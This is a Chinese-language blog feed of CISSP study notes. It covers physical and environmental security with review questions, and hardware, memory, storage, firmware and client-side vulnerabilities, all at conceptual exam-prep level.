如果设备通过受限制的区域控制物理安全，那么就需要具备管理来访者的方法。来访者经常会被指派一名陪同，并且他们的访问和行动都要受到严密监视。当外来人员被授权进入受保护的区域时，未能对他们的行动进行跟踪可能会导致针对保护程度最高的资产的恶意行为。</li><li><strong>理解为管理物理安全而进行的安全控制的三种策略，并且能够举出它们的例子</strong> 用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。理解何时以及如何使用这些类型，并且能够列出每种类型的例子。</li><li><strong>理解介质存储的安全需求</strong> 介质存储设施应该被设计用于安全地保存空白介质、可重用介质和安装介质。关注的问题包括盗窃、数据损坏和数据的残余恢复。对介质存储设备的保护包括带锁的柜子或保险箱、使用库管理员或保管员、实施存入/取出过程以及利用介质消磁。</li><li><strong>理解证据存储的问题</strong> 证据存储用来保留用于恢复、内部调查和电子取证调查的日志、驱动图像、虚拟机快照和其他数据。保护措施包括专用/隔离存储设施、离线存储、活动跟踪、哈希管理、访问限制和加密。</li><li><strong>理解物理访问控制的常见威胁</strong> 无论使用哪一种形式的物理访问控制，为了阻止滥用、伪装和尾随，必须同时配备保安人员或其他监控系统。物理访问控制的滥用是指打开安全门或者绕过锁或访问控制措施。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某人通过受到安全保护的门或通道，而本身没有接受身份识别或获得授权。</li><li><strong>理解对审计跟踪和访问日志的需要</strong> 对于物理访问控制来说，审计跟踪和访问日志也是非常有用的工具。它们可能需要保安人员手工建立，或者在有足够的自动化访问控制机制(例如，智能卡和某些接近式读卡机)的情况下自动生成。还可以考虑使用CCTV(闭路电视)进行入口点的监控。CCTV(闭路电视)能够将审计跟踪和访问日志与可视化的事件历史记录进行比较。这些信息对于重新构建入侵、破坏或攻击事件非常关键。</li><li><strong>理解对平稳电源的需要</strong> 电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。许多组织机构通过几种方法来选择管理他们自己的电源。不间断电源供应(UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。UPS在主要电源出现故障或无法获得的情况下，还能够提供持续的电力供应。UPS可以提供数十分钟或数小时的电力，这取决于它的容量和设备所需的用电量。</li><li><strong>理解常用的电力术语</strong> 知道下列术语的定义： 故障、中断、电压不足、降压、脉冲、电涌、起动功率、噪声、瞬时现象、平稳和接地。</li><li><strong>理解如何控制环境</strong> 除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。主要放置计算机的房间应该保持温度在华氏60到75度之间(即摄氏15到23度)。计算机房间的湿度应该维持在40%和60%之间。湿度太高会导致侵蚀，湿度太低会导致产生静电。</li><li><strong>知道什么是静电</strong> 即使在不产生静电的地毯上，如果环境中的湿度太低，那么也仍然可能产生两万伏特的静电放电。即使很少的静电放电也可能毁坏电子设备。</li><li><strong>理解管理漏水和水灾的需求</strong> 环境安全策略和措施中应当解决漏水和水灾问题。管道漏水不会每天都发生，但当真的发生时，经常会造或重大的损失。水和电是不能相容的。如果计算机系统与水接触了(特别是在系统运行时)，那么就会发生损坏事故。只要有可能，就要让放置服务器的房间和重要计算机设备远离任何水源或传输管道。</li><li><strong>理解防火检测和灭火措施的重要性</strong> 防火检测和灭火措施绝不能被忽略。保护人员不受到伤害应该始终是所有安全或保护系统中最重要的目标。除了保护人员不受到伤害以外，设计防火检测和灭火措施的目的是将由火、烟、热和灭火材料引起的损失最小化，特别是与IT基础设施相关的部分。</li><li><strong>理解由于火灾和灭火材料可能导致的环境污染和损失</strong> 火灾引起的破坏性要素包括烟和热，也包括灭火介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须解决所有这些问题。</li><li><strong>理解人员的隐私和安全</strong> 在所有的情况下，安全最重要的作用方面是保护人。因此，防止对人的伤害是所有安全解决方案中最重要的目标。</li></ul><h3 id="10-5-复习题"><a href="#10-5-复习题" class="headerlink" title="10.5 复习题"></a>10.5 复习题</h3><ol><li><p>以下哪一项是安全中最重要的方面?<br>A. 物理安全<br>B. 入侵检测<br>C. 逻辑安全<br>D. 意识培训</p></li><li><p>对于新的设施，有什么方法可以用来制定出组织的需要?<br>A. 日志文件审计<br>B. 关键路径分析<br>C. 风险分析<br>D. 存货清单</p></li><li><p>通常什么基础设施组件位于多个楼层的相同位置，用于把每个楼层网络连接在一起以提供便利?<br>A. 服务器机房<br>B. 配线间<br>C. 数据中心<br>D. 介质柜</p></li><li><p>以下哪一项不是设施或场地的安全关注的设计元素?<br>A. 工作区和访客区的隔离<br>B. 限制对高价值或重要区域的访问<br>C. 位于设施核心或中央位置的机密区域<br>D. 对设施内所有位置的相同访问</p></li><li><p>为了维持最有效和安全的服务器机房，以下哪一项不必是真的?<br>A. 必须和人共存<br>B. 必须包括非水灭火装置的使用<br>C. 湿度必须保持在40%到60%之间<br>D. 温度必须保持在华氏60到75度</p></li><li><p>下列哪个典型的安全措施的执行不涉及包含可重用移动介质的存储设施?<br>A. 雇佣库管理员或保管员<br>B. 使用存入/取出过程<br>C. 哈希<br>D. 在返回的介质上使用净化工具</p></li><li><p>以下哪一项是一套双门，往往由保安人员保护，并且用于容纳主体，并直到他们的身份和授权信息被验证?<br>A. 大门<br>B. 旋转门<br>C. 陷阱<br>D. 接近式传感器</p></li><li><p>周边安全设备或机制的最常见形式是什么?<br>A. 保安人员<br>B. 栅栏<br>C. CCTV(闭路电视)<br>D. 照明</p></li><li><p>以下哪一项不是使用保安人员的缺点?<br>A. 保安人员通常不了解设施内操作的范围<br>B 并非所有环境和设施都支持保安人员<br>C. 并非所有安全人员自身就是可靠的<br>D. 预先筛选、联系和培训并不能保证安全人员的有效和可靠</p></li><li><p>基于水的灭火系统中最常见的故障原因是什么?<br>A. 缺水<br>B. 人<br>C. 离子检测器<br>D. 在吊顶上探测仪的布放</p></li><li><p>物理访问控制设备最普通和便直的是什么?<br>A. 照明<br>B. 保安人员<br>C. 钥匙锁<br>D. 栅栏</p></li><li><p>什么类型的运动检测仪能感应到被监控对象周围电场或磁场的变化?<br>A. 波形检测仪<br>B. 光电检测仪<br>C. 热能检测仪<br>D. 电容检测仪</p></li><li><p>以下哪一项不是触发物理安全报警的典型类型?<br>A. 预防<br>B. 威慑<br>C. 排斥<br>D. 通知</p></li><li><p>无论使用何种形式的物理访问控制，保安人员或其他监控系统都必须被部署来阻止以下问题，但除了哪一个?<br>A. 尾随<br>B. 间谍<br>C. 伪装<br>D. 滥用</p></li><li><p>所有安全解决方案中最重要的目标是什么?<br>A. 暴露阻止<br>B. 维护完整性<br>C. 人身安全<br>D. 维持可用性</p></li><li><p>计算机机房理想的湿度范围是什么?<br>A. 20%至40%<br>B. 40%至60%<br>C. 60%至75%<br>D. 80%至95%</p></li><li><p>什么电压等级的静电会引起存储在硬盘中的数据的破坏?<br>A. 4000 伏特<br>B. 17000 伏特<br>C. 40 伏特<br>D. 1500 伏特</p></li><li><p>B类灭火器不会使用下列哪个灭火材料?<br>A. 水<br>B. 二氧化碳<br>C. 晗龙或可接受的哈龙替代品<br>D. 苏打酸</p></li><li><p>对于计算机设施，基于水的灭火系统最好的类型是什么?<br>A. 湿管系统<br>B. 干管系统<br>C. 预先响应系统<br>D. 洪水系统</p></li><li><p>在发生火灾和除非灭火的情况下，下列哪一项不是造成计算机设备损坏的罪魁祸首?<br>A. 热<br>B. 灭火介质<br>C. 烟<br>D. 照明</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（9）——安全脆弱性、威胁和对策</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E8%84%86%E5%BC%B1%E6%80%A7%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E8%84%86%E5%BC%B1%E6%80%A7%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3) 安全工程(安全的工程学和管理)</p><ul><li>E. 评估和缓解安全架构、设计和解决方案元素的脆弱性<ul><li>E.1 基于客户端(例如，applet、本地缓存)</li><li>E.2 基于服务器(例如，数据流控制)</li><li>E.3 数据库安全(例如，推理、汇聚、数据挖掘、数据分析、数据仓库)</li><li>E.4 大规模并行数据系统</li><li>E.5 分布式系统(例如，云计算、网格计算、点对点)</li><li>E.6 密码系统</li><li>E.7 工业控制系统(例如，SCADA)</li></ul></li><li>F. 评估和缓解基于Web的系统(例如，XML、OWASP)的脆弱性</li><li>G. 评估和缓解移动系统的脆弱性</li><li>H. 评估和缓解嵌入式设备和物联网系统(例如，网络使能设备、物联网(loT))的脆弱性</li></ul><h3 id="9-1-评估和缓解安全脆弱性"><a href="#9-1-评估和缓解安全脆弱性" class="headerlink" title="9.1 评估和缓解安全脆弱性"></a>9.1 评估和缓解安全脆弱性</h3><h4 id="9-1-1-硬件"><a href="#9-1-1-硬件" class="headerlink" title="9.1.1 硬件"></a>9.1.1 硬件</h4><p>　　术语”硬件”包含计算机可以实际触摸到的任何有形部分，范围从键盘、显示器到CPU、存储介质和内存条。</p><h5 id="1-处理器"><a href="#1-处理器" class="headerlink" title="1. 处理器"></a>1. 处理器</h5><p>　　通常被称为处理器的CPU是计算机的神经中枢，是一个芯片或多个芯片(在多处理器系统中)，负责管理所有重要的计算操作，并且直接执行或协调复杂的计算工作，从而使计算机完成预定的任务。虽然允许计算机执行复杂的任务，但CPU 实际上都只能执行有限的计算和逻辑操作集，这允许CPU以极快的速度执行计算和逻辑操作。</p><h5 id="2-执行类型"><a href="#2-执行类型" class="headerlink" title="2. 执行类型"></a>2. 执行类型</h5><ul><li><strong>多任务处理</strong> 多任务处理指的是同时处理两个或更多个任务，在任意给定时间都能够应付多个任务或进程。事实上，大多数系统并不是真正的多任务处理系统，它们依靠操作系统，通过仔细构造发送给CPU 执行的命令的顺序来模拟多任务处理。</li><li><strong>多处理</strong> 在多处理环境中，多处理器计算系统(也就是具有多个CPU的系统)利用多个处理器的能力完成一个应用程序的处理任务。在具有多个CPU的现代系统中，具有两种常见的多处理系统类型。单个计算机包含多个由一个操作系统控制的处理器，这被称为对称多处理(Symmetric Mu1tiProcessing，SMP)。在SMP中，处理器不但共享通用操作系统，而且共享通用数据总线和内存资源。另一种被称为大规模并行处理(Massively Parallel Processing，MPP)系统中驻留了数百个甚至上千个处理器，每个处理器都具有自己的操作系统和内存/总线资源。当协调整个系统的活动并调度处理的软件遇到某个计算密集任务时，会分配某个处理器负责完成任务。这个处理器随后将任务分解为若干易于处理的部分，并把这些部分分配给其他处理器执行。那些处理器将它们的计算结果返回至协调处理器，所有计算结果在协调处理器中被重新组合并返回给提出请求的应用程序。MPP系统的能力非常强大(不用说，成本也十分高昂)，并且是很多计算研究中使用的主要系统。</li><li><strong>多程序设计</strong> 为了达到提高计算效率的目的，多程序设计通过操作系统对单个处理器上的两个任务进行协调，从而模拟两个任务同时执行的情况。这种方法在完成某个任务时会导致显著的延迟。不过，对于同一批中的所有进程而言，完成所有任务所需的总时间会减少。多程序设计和多任务处理技术之间存在下列两个主要差异：<ul><li>多程序设计通常在大规模系统(例如，大型机)中使用，而多任务处理在个人计算机操作系统(例如，Windows和Linux)中使用。</li><li>多任务处理通常由操作系统协调使用，而多程序设计则要求特别编写的软件，这种软件通过操作系统来协调自己的活动和执行。</li></ul></li><li><strong>多线程处理</strong> 多线程处理允许在单个进程中执行多个并发任务。线程是一个自包含的指令序列，可以与作为同一父进程一部分的其他线程井行执行。</li></ul><h5 id="3-处理类型"><a href="#3-处理类型" class="headerlink" title="3. 处理类型"></a>3. 处理类型</h5><ul><li><strong>单一状态</strong> 单一状态系统要求使用策略机制来管理不同安全级别的信息。在这种类型的方案中，安全管理员准许处理器和系统每次只处理一个安全级别的问题。</li><li><strong>多态</strong> 多态系统能够实现更高的安全级别。这些系统是被认证过的，通过使用特定的安全机制同时处理多个安全级别。这些安全机制被设计用于阻止信息跨越不同的安全级别。</li></ul><h5 id="4-保护机制"><a href="#4-保护机制" class="headerlink" title="4. 保护机制"></a>4. 保护机制</h5><img src="/notes/cissp学习笔记（9）——安全脆弱性、威胁和对策/保护环.png"><ul><li><strong>保护环</strong> 从安全性的观点出发，保护环将操作系统中的代码和组件(以及应用程序、实用程序或由操作系统控制运行的其他代码)组织在如图所示的同心环内。越进入圆环的内部，与占据特定环的代码相关联的特权级别就越高。环模型的本质在于优先权、特权和内存分割。希望执行的任何进程必须排队等待(进程暂挂队列)。与最小环号相关联的进程总是比与较大环号相关联的进程先运行。在较低编号的环中的进程能够比较高编号的环中的进程访问更多的资源，并且能够更直接地与操作系统交互。在较高编号的环上运行的进程通常必须请求较低编号的环中的处理程序或驱动程序来获得需要的服务，有时这被称为居间访问模型。从安全性的观点出发，环模型使得操作系统能够将自身与用户和应用程序隔离开并加以保护，还允许在高特权操作系统组件(例如，内核)和低特权操作系统部分(例如，操作系统的其他部分以及驱动程序和实用程序)之间实施严格的界线。</li><li><strong>进程状态</strong> 进程状态也被称为操作状态，指的是进程可能在其中运行的各种执行形式。根据进程是否运行，进程可以运作在下列几种状态之一：<ul><li><strong>就绪状态</strong> 在就绪状态中，进程准备在被调度执行时立刻继续或开始处理。在进程到达这个状态时，如果CPU可用，那么进程就会直接转移到运行模式： 如果CPU 不可用，那么进程就停留在就绪状态直至CPU 可用。</li><li><strong>等待状态</strong> 等待状态还可以被理解为” 等待某种资源”，也就是说，进程准备继续执行，但是在能够继续处理之前需要等待某台设备或访问请求(某种中断)提供服务。一些引用将此状态标记为阻塞状态，因为该状态可以阻止进一步的执行，直到某个外部事件发生为止。</li><li><strong>运行状态</strong> 运行中的进程在CPU中执行直至完成、时间片到期或由于某些原因而阻塞(通常是由于生成访问设备或网络的中断并且等待中断完成)。如果进程在时间片结束时尚未完成，那么进程就会返回就绪状态并在队列中排队; 如果在等待资源变得可用时阻塞进程，进程便进入等待状态并排队。</li><li><strong>监管状态</strong> 在进程必须执行的动作要求大于问题状态特权组的特权时(包括更改系统配置、安装设备驱动程序或更改安全设置)，就需要使用监管状态。基本上，没有在用户模式(环3)或问题状态中出现的功能会在监管模式中实现。</li><li><strong>停止状态</strong> 进程结束或者由于发生错误、所请求资源不可用或无法满足资源请求而必须终止时，就会进入停止状态。</li></ul></li><li><strong>安全模式</strong> 在能够部署安全模式之前，必须存在下列三种特定的元素：1.分层的MAC环境；2.对能够访问计算机控制台的主体的完全物理控制；3.对能够进入计算机控制台所在房间的主体的完全物理控制。美国政府为处理分类信息的系统指派了4种被批准的安全模式：<ul><li><strong>专用模式</strong> 专用模式系统本质上相当于本章前面” 处理类型” 中描述的单一状态系统。对于专用系统的用户来说，存在下列三个要求：1.每个用户都必须具有允许访问系统所处理全部信息的安全许可；2.每个用户都必须被批准访问系统所处理的全部信息；3.每个用户都必须具有有效的、对系统所处理全部信息的”知其所需”权限。</li><li><strong>系统高级模式</strong> 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统所处理的全部信息。每个用户都必须具有有效的、对系统所处理部分信息的”知其所需”权限。专用模式和系统高级模式之间的主要差异是： 在系统高级模式的计算设备上，所有用户不必具有对系统所处理全部信息的”知其所需”权限。</li><li><strong>分隔模式</strong> 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统中所需要访问的任何信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的” 知其所需” 权限。分隔模式和系统高级模式之间的主要差异是： 分隔模式系统的用户不必被批准访问系统中的全部信息。然而，与系统高级模式系统和专用模式系统一样的是，分隔模式系统的所有用户仍然必须具有适当的安全许可。</li><li><strong>多级模式</strong> 某些用户不具有访问系统所处理全部信息的有效安全许可。因此，访问由主体的许可级别是否优于客体的敏感度级别控制。每个用户都必须被批准访问系统中所需要访问的所有信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的”知其所需”权限。</li></ul></li></ul><p>　　根据所需的安全许可、” 知其所需” 权限以及处理多许可级别数据σDMCL)的能力，下表概述和比较了这4种安全模式。</p><table><thead><tr><th>模式</th><th>安全许可</th><th>知其所需</th><th>PDMCL</th></tr></thead><tbody><tr><td>专用模式</td><td>相同</td><td>无</td><td>无</td></tr><tr><td>系统高级模式</td><td>相同</td><td>是</td><td>无</td></tr><tr><td>分隔模式</td><td>相同</td><td>是</td><td>是</td></tr><tr><td>多级模式</td><td>不同</td><td>是</td><td>是</td></tr></tbody></table><h5 id="5-操作模式"><a href="#5-操作模式" class="headerlink" title="5. 操作模式"></a>5. 操作模式</h5><ul><li><strong>用户模式</strong> 用户模式是在执行用户应用程序时CPU 使用的基本模式。在这种模式中，CPU只允许执行其整个指令集中的部分指令。这样设计的目的是防止用户因为执行设计得很差的代码或无意识地滥用代码而意外损坏系统，此外还保护系统及其数据免遭怀有恶意用户的攻击，这些恶意用户可能企图通过执行精心设计的指令来避开操作系统设置的安全措施，也可能错误地执行会导致未授权访问、损害系统或有价值信息资产的动作。</li><li><strong>特权模式</strong> CPU也支持特权模式，这种模式被设计用于授予操作系统访问CPU所支持完整指令的特权。</li></ul><h4 id="9-1-2-存储器"><a href="#9-1-2-存储器" class="headerlink" title="9.1.2 存储器"></a>9.1.2 存储器</h4><h5 id="1-只读存储器"><a href="#1-只读存储器" class="headerlink" title="1. 只读存储器"></a>1. 只读存储器</h5><p>　　只读存储器(Read-Only Memory，ROM)就是PC能够读但是不能修改(也就是不允许写)的存储器。标准ROM 芯片的内容在出厂时就被”烧入”，并且终端用户无法改变其中的内容。ROM的主要优点在于不能被修改。用户或系统管理员意外发生的错误无法清除或修改芯片上的内容，这个特性使得ROM特别适于协调计算机最内层的工作。有一种ROM类型可以被系统管理员在一定范围内予以修改，这种ROM被称为可编程只读存储器(Programrnable Read-Only Memory，PROM)，并且具有如下所示的几种子类型：</p><ul><li><strong>可编程只读存储器</strong> 基本的可编程只读存储器(PROM)芯片井入了特殊的功能，允许终端用户稍后在芯片中烧入内容。一旦数据被写入PROM 芯片，那么就不能再被更改。</li><li>**可擦除可编程只读存储器(Erasable PROM，EPROM) 在这些芯片上有一个很小的窗口，当用特殊的紫外线光照射时就可以擦除芯片上的内容。这个过程完成后，终端用户就可以将新的信息烧入EPROM，就像它之前从未编程一样。</li><li><strong>电可擦除可编程只读存储器(Electronically ERPOM，EEPROM)</strong> 电可擦除PROM(EEPROM)是另一种更灵活的、更友好的解决方案，使用送到芯片引脚上的电压强制进行擦除。擦除EEPROM时，不用从计算机上拆除芯片。</li><li><strong>闪存</strong> 闪存是EEPROM的衍生概念。它是一种非易失性存储媒体，可以进行电子擦除和重写。EEPROM 和闪存主要的区别是，EEPROM必须完全擦除后才能重写，而闪存可以以块或页的方式进行擦写。</li></ul><h5 id="2-随机存取存储器"><a href="#2-随机存取存储器" class="headerlink" title="2. 随机存取存储器"></a>2. 随机存取存储器</h5><p>　　随机存取存储器(Random Access Memory，RAM)是可读和可写的存储器，包含计算机在处理过程中使用的信息。只有当电源持续不断供应时，RAM才能保存其内容。下面是RAM的几种类型：</p><ul><li><strong>实际的存储器</strong> 实际的存储器(也被称为主存储器)通常是计算机中可用的最大的RAM存储资源。实际的存储器一般由许多动态的RAM芯片组成，因此，CPU必须定期对它们进行刷新。</li><li><strong>高速缓存RAM</strong> 通过将数据从速度较慢的设备取出并暂时存储在高性能的设备上，以便在希望时可以重复使用，高速缓存能够提高系统的性能。</li></ul><h5 id="3-寄存器"><a href="#3-寄存器" class="headerlink" title="3. 寄存器"></a>3. 寄存器</h5><p>　　CPU还包括一种有限容量的板上存储器，即寄存器。在执行计算或处理指令时，寄存器为CPU的核心部分(也就是算术逻辑单元(Arithmetic-Logical Unit，ALU))提供可直接访问的存储位置。事实上，除了数据作为指令的一部分直接提供外，ALU操纵的任何数据必须被载入寄存器。这种存储器类型的主要优点是ALU本身的一部分，因此计算速度与标准的CPU速度一致。</p><h5 id="4-存储器寻址"><a href="#4-存储器寻址" class="headerlink" title="4. 存储器寻址"></a>4. 存储器寻址</h5><p>　　当利用存储器资源时，处理器必须具有引用存储器中不同位置的方法。解决这个问题的办法被称为寻址，并且在不同的环境中存在多种不同的寻址方案。接下来我们将讨论5种比较常用的寻址方案：</p><ul><li><strong>寄存器寻址</strong> 前面曾经提到过，寄存器直接安装在CPU上的非常小的存储位置。当CPU需要从某个寄存器中获得信息来完成操作时，可以使用寄存器地址(例如，”寄存器1”)去访问寄存器的内容。</li><li><strong>立即寻址</strong> 就其本身而言，立即寻址并不是一种技术上的存储器寻址方案，而是引用某些数据的一种方法，这些数据作为指令的一部分提供给CPU使用。</li><li><strong>直接寻址</strong> 在直接寻址中，要访问的存储器位置的实际地址会被提供给CPU。这个地址必须与正在执行的指令位于相同的存储页面上。因为与重新编写立即寻址的硬编码数据相比，存储位置的内容能够更容易地被改变，所以直接寻址比立即寻址更灵活。</li><li><strong>间接寻址</strong> 间接寻址使用的方案类似于直接寻址。但是，作为指令的一部分提供给CPU的存储器地址并不包含CPU用作操作数的真实数值。实际上，存储器地址中包含另一个存储器地址(也许位于不同的页面上)。CPU通过读取间接地址来了解待操作数据驻留的位置，随后从这个地址取出真实的操作数。</li><li><strong>基址+偏移量寻址</strong> 基址叫扁移量寻址使用存储在某个CPU寄存器中的数值作为开始计算的基址。然后，CPU将指令提供的偏移量与基址相加，并从计算得到的存储位置取出操作数。</li></ul><h5 id="5-辅助存储器"><a href="#5-辅助存储器" class="headerlink" title="5. 辅助存储器"></a>5. 辅助存储器</h5><p>　　“辅助存储器”这个术语通常是指磁’即光学介质或者包含CPU不能立刻获得的数据的其他存储设备。辅助存储器比主存储器的价格便直许多，而且可以被用于存储大量的信息。</p><h5 id="6-存储器的安全问题"><a href="#6-存储器的安全问题" class="headerlink" title="6. 存储器的安全问题"></a>6. 存储器的安全问题</h5><p>　　存储器存储并处理数据，而某些数据可能极其敏感。任何保留敏感数据的存储器设备在由于某种原因被允许离<br>开组织之前，应当清除里面的数据。围绕存储器的最重要的一个安全问题是： 在计算机使用过程中一定要控制哪些人可以对存储在存储器中的数据进行访问。</p><h4 id="9-1-3-存储设备"><a href="#9-1-3-存储设备" class="headerlink" title="9.1.3 存储设备"></a>9.1.3 存储设备</h4><ul><li><p>主存储设备与辅助存储设备<br>主存储器也称为主存储设备，是计算机用于保存运行时CPU容易获得的必要信息的RAM。辅助存储器或辅助存储设备包括人们熟悉的每天都使用的长期存储设备。辅助存储设备由磁性介质和光学介质组成。</p></li><li><p>易失性存储设备与非易失性存储设备<br>存储设备的易失性只是一种用来衡量存储设备在电源被切断时丢失数据的可能性的方法。被设计用于保留数据的设备(如磁性介质)属于非易失性的。</p></li><li><p>随机存取与顺序存取<br>存储设备的存取方式有两种。随机存取存储设备允许操作系统通过使用某种寻址系统从设备内的任何位置立刻读取(有时会写入)数据。几乎所有的主存储设备都是随机存取设备。可以使用一个内存地址直接存取存储在RAM 芯片中任何位置的信息，而不必读取在此位置之前物理存储的数据。另一方面，顺序存储设备并不提供这种灵活性。它们要求在到达指定位置之前读取(或快速经过)该位置之前物理存储的所有数据。显而易见，顺序存取存储设备要比随机存取存储设备的操作速度慢许多。但是，此时再次需要根据成本/效益做出决定。许多顺序存取存储设备能够使用价格相对便直的介质保存大量的数据，这个特性使得磁带机非常适合用于与灾难恢复或业务连续性计划相关联的备份任务。</p></li></ul><h4 id="9-1-4-存储介质的安全性"><a href="#9-1-4-存储介质的安全性" class="headerlink" title="9.1.4 存储介质的安全性"></a>9.1.4 存储介质的安全性</h4><ul><li>即使在数据被删除之后，数据仍然可能保留在辅助存储设备上，这种情况被称为数据剩磁。如果确实希望从辅助存储设备上删除数据，那么就需要使用专门设计的实用程序来破坏设备上相应数据的所有磁道，或者破坏或销毁辅助存储设备，从而使其无法被修复(通常称为净化)。</li><li>固态硬盘对于净化呈现出独特的问题。SSD损耗均衡意味着有经常未被标记为”存活”状态的数据块，当它被关闭复制以降低磨损平整块(lower wear leveled bolcks)时仍保存了数据的副本。这意味着对于固态硬盘的数据安全措施，传统的归零是无效的。</li><li>辅助存储设备还很容易被盗。因此，重要的是要使用全磁盘加密，以减少未经授权的实体获取数据的风险。由于SSD的损耗均衡技术，在SSD存储数据之前对其进行全盘加密是一个良好的安全实践。这将减少任何明文数据驻留在休眠块(dormant blocks)中的机会。</li><li>对存储在辅助存储设备上的数据进行访问，是计算机安全专家所面对的最紧要的问题之一。对于硬盘来说，通过结合操作系统的访问控制往往就可以对数据进行保护。可移动介质的安全则面临着极大的挑战，因此对它们的保护经常需要使用密码技术。</li></ul><h4 id="9-1-5-输入和输出设备"><a href="#9-1-5-输入和输出设备" class="headerlink" title="9.1.5 输入和输出设备"></a>9.1.5 输入和输出设备</h4><ul><li><p>显示器<br>有一种被称为TEMPEST 的技术会危及显示器上所显示数据的安全性。TEMPEST技术可以从一定距离外甚至另一个地点探测到每台显示器所发出的电子辐射(被称为Van Eck辐射)。关于任意显示器最大争议的最大风险仍然是肩窥或相机的长焦镜头。</p></li><li><p>打印机<br>由于组织使用了物理安全控制措施，因此带着打印出来的敏感信息走出办公室要比带着软盘或其他磁性介质离开更容易。此外，如果打印机是共享的，那么用户可能会忘了及时取回他们打印出来的敏感信息，因而容易被人偷窥。许多现代的打印机也在本地存储数据，这些数据往往存储在硬盘驱动器上，有一些还保留着无限期的打印拷贝。</p></li><li><p>键盘/鼠标<br>一种简单的设备可以被放在键盘内部或放在连接电缆旁，从而能够截获所有的击键行为，并且可以使用无线电信号将它们传送到远程接收器。此外，如果键盘和鼠标是无线的(包括蓝牙)，那么它们的无线电信号也能够被截获。</p></li><li><p>调制解调器<br>调制解调器允许用户在网络内创建非受控的访问点。在最坏的情况中，如果配置不正确，那么调制解调器会产生相当严重的安全脆弱性，从而致使外部人员突破保护机制的安全防线井直接访问网络资源。最糟糕的是，调制解调器会生成一条可选的出口通道，内部用户可以使用它将数据泄漏到组织外部。</p></li><li><p>输入/输出结构<br>与通用输入碎市出(I/O)操作相关的某些计算机活动(并非单独的设备)也具有安全含义。需要在一定程度上熟悉手动输入碎命出设备配置，以便将旧式的外围设备(这些设备没有自动配置或支持即插即用设置)集成到现代PC中。</p><ul><li><strong>存储映射I/O</strong> CPU管理的地址空间部分能够通过一系列映射的内存地址或位置提供对某些设备类别的访问。从配置的角度看，确认只有一台设备映射到某个特定的存储地址范围以及这个存储地址范围只用于处理设备1/0 是非常重要的。从安全性的角度看，对映射存储位置的访问应当由操作系统居间调停，并且应当得到正确的授权和访问控制。</li><li><strong>中断(IRQ)</strong> 中断(IRQ)是中断请求的缩写，这种技术通过特殊的中断控制器为特定设备指派特定的信号线。从配置的角度看，找出对过时设备有用的未用IRQ号有时是个不断尝试的过程。从安全性的角度看，只有操作系统能够在足够高的特权级别间接访问IRQ，以便防止篡改或意外的错误配置。</li><li><strong>直接内存访问(Direct Memory Access，DMA)</strong> 直接内存访问(DMA)像具有两条信号线的通道一样工作，其中一条线是DMA请求(DRQ)线，另一条则是DMA确认(DACK)线。不需要CPU帮助就可以直接交换实际存储器中数据的设备使用DMA来管理这样的访问。从配置的角度看，管理DMA地址以保持设备地址的唯一性以及确认这样的地址只用于DMA信号发送，是非常重要的。从安全性的角度看，只有操作系统才能够调停DMA的分配以及访问I/O设备的DMA的使用。</li></ul></li></ul><h4 id="9-1-6-固件"><a href="#9-1-6-固件" class="headerlink" title="9.1.6 固件"></a>9.1.6 固件</h4><ul><li><p>BIOS<br>基本输入输出系统(Basic InputJOutput System，BIOS)包含独立于操作系统的原始指令，这些指令被用于启动计算机和从磁盘加载操作系统。BIOS被包含在一个国件设备中，在启动时能够由计算机立即访问。在大多数计算机中，BIOS被存储在EEPROM芯片上以帮助版本升级。BIOS的升级过程被称为”闪存BIOS”。</p></li><li><p>设备固件<br>为了完成任务，许多硬件设备(如打印机和调制解调器)还需要一些有限的处理能力，以便最小化操作系统自身的负担。在许多情况下，这些”迷你型”操作系统完全被包含在相应设备上的固件芯片内。与计算机的BIOS一样，设备固件往往被存储在EEPROM设备上，从而可以在需要时进行更新。</p></li></ul><h3 id="9-2-基于客户端"><a href="#9-2-基于客户端" class="headerlink" title="9.2 基于客户端"></a>9.2 基于客户端</h3><p>　　基于客户端漏洞会使用户及其数据和系统面临遭受攻击和破坏的风险。客户端攻击是能够损害客户的任何攻击类型。客户端或客户端集中攻击的目标是客户机本身或客户机上的进程。</p><h4 id="9-2-1-applet"><a href="#9-2-1-applet" class="headerlink" title="9.2.1 applet"></a>9.2.1 applet</h4><p>　　代理是用户系统发送的、能够对远程系统上存储的数据进行查询和处理的代码对象。applet执行相反的功能，这些代码对象被从服务器发送至客户端以便执行某些操作。事实上，applet实际上是一些自包含的小型程序，这些程序的执行独立于发送它们的服务器。这为远程服务器和终端用户提供了很多优点：</p><ul><li>处理压力被转移至客户端，Web服务器上的资源得到了释放，从而能够处理更多用户的请求。</li><li>客户端可以使用本地资源处理后得到数据，而不是等待远程服务器的响应。在很多情况下，这可以更快地响应对输入数据的修改。</li><li>在正确编程的applet中，Web服务器并不接收作为输入信息提供给applet的数据，因此可以维护财务数据的安全性和隐私性。</li></ul><p>　　